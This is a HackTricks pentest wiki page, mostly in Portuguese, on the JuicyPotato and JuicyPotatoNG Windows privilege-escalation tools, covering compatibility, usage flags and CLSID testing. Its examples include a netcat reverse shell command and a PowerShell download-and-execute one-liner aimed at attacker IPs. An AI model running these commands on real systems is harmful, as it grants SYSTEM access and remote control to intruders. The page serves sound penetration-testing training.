# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato é legacy. Geralmente funciona em versões do Windows até Windows 10 1803 / Windows Server 2016. Alterações da Microsoft entregues a partir do Windows 10 1809 / Server 2019 quebraram a técnica original. Para essas builds e mais recentes, considere alternativas modernas como PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato e outras. Veja a página abaixo para opções e uso atualizados.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusando dos privilégios dourados) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Uma versão adoçada de_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, com um pouco de suco, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Notas rápidas de compatibilidade

- Funciona de forma confiável até Windows 10 1803 e Windows Server 2016 quando o contexto atual possui SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege.
- Quebrado pelo hardening da Microsoft no Windows 10 1809 / Windows Server 2019 e posteriores. Prefira as alternativas ligadas acima para essas builds.

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

We decided to weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Say hello to Juicy Potato**.

> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.

Descobrimos que, além do `BITS`, existem vários COM servers que podemos abusar. Eles só precisam:

1. ser instanciáveis pelo usuário atual, normalmente um “service user” que tem privilégios de impersonation
2. implementar a interface `IMarshal`
3. rodar como um usuário elevado (SYSTEM, Administrator, …)

Após alguns testes obtivemos e testamos uma lista extensa de [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) em várias versões do Windows.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato permite que você:

- **CLSID alvo** _escolha qualquer CLSID que desejar._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _você pode encontrar a lista organizada por OS._
- **COM Listening port** _defina a porta de escuta COM que preferir (em vez do 6666 hardcoded usado no marshalled)_
- **COM Listening IP address** _vincule o servidor a qualquer IP_
- **Modo de criação de processo** _dependendo dos privilégios do usuário impersonado você pode escolher entre:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _inicie um executável ou script se a exploração for bem-sucedida_
- **Process Argument** _personalize os argumentos do processo lançado_
- **RPC Server address** _para uma abordagem stealth você pode autenticar em um servidor RPC externo_
- **RPC Server port** _útil se você quiser autenticar em um servidor externo e o firewall estiver bloqueando a porta `135`…_
- **TEST mode** _principalmente para fins de teste, i.e. testar CLSIDs. Cria o DCOM e imprime o usuário do token. See_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Considerações finais <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Se o usuário tiver privilégios `SeImpersonate` ou `SeAssignPrimaryToken` então você é **SYSTEM**.

É quase impossível prevenir o abuso de todos esses COM Servers. Você pode pensar em modificar as permissões desses objetos via `DCOMCNFG`, mas boa sorte, isso vai ser desafiador.

A solução real é proteger contas sensíveis e aplicações que rodam sob as contas `* SERVICE`. Parar o `DCOM` certamente impediria esse exploit, mas poderia ter um impacto sério no sistema operacional subjacente.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG re-introduces a JuicyPotato-style local privilege escalation on modern Windows by combining:
- DCOM OXID resolution to a local RPC server on a chosen port, avoiding the old hardcoded 127.0.0.1:6666 listener.
- An SSPI hook to capture and impersonate the inbound SYSTEM authentication without requiring RpcImpersonateClient, which also enables CreateProcessAsUser when only SeAssignPrimaryTokenPrivilege is present.
- Tricks to satisfy DCOM activation constraints (e.g., the former INTERACTIVE-group requirement when targeting PrintNotify / ActiveX Installer Service classes).

Important notes (evolving behavior across builds):
- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

Basic usage (more flags in the help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Se você estiver direcionando Windows 10 1809 / Server 2019 onde o classic JuicyPotato foi corrigido, prefira as alternativas mencionadas no topo (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG pode ser situacional dependendo da build e do estado do serviço.

## Exemplos

Nota: Visite [esta página](https://ohpe.it/juicy-potato/CLSID/) para uma lista de CLSIDs para testar.

### Obter um reverse shell (nc.exe)
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Iniciar um novo CMD (se você tiver acesso RDP)

![](<../../images/image (300).png>)

## Problemas de CLSID

Frequentemente, o CLSID padrão que o JuicyPotato usa **não funciona** e o exploit falha. Normalmente, são necessárias múltiplas tentativas para encontrar um **CLSID funcional**. Para obter uma lista de CLSIDs para tentar em um sistema operacional específico, você deve visitar esta página:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Verificando CLSIDs**

Primeiro, você vai precisar de alguns executáveis além do juicypotato.exe.

Download [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) e carregue-o na sua sessão PS, e faça o download e execute [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Esse script criará uma lista de possíveis CLSIDs para testar.

Em seguida, baixe [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(altere o caminho para a lista de CLSID e para o executável juicypotato) e execute-o. Ele começará a testar cada CLSID, e **quando o número da porta mudar, isso significará que o CLSID funcionou**.

**Verifique** os CLSIDs funcionais **usando o parâmetro -c**

## Referências

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
